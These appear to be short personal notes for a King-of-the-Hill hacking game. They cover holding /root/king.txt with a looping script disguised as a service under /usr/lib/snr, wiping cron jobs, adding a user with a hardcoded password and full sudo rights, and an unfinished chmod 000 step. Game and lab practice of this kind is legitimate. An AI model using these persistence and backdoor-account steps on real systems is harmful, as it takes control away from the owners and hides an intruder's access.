# king process
```
mkdir /usr/lib/snr
touch /usr/lib/snr/snr-service

#!/bin/bash

while [ 1 ]
do
 sleep 1s;
 echo "shunaroo" > /root/king.txt;
done
```

# delete cron
cron -r

# adduser
```
useradd shunaroo
passwd shunaroo
ShunaroO

visudo -f /etc/sudoer.d/shunaroo

shunaroo ALL=(ALL) ALL
```

# 権限変更
- chmod 000 


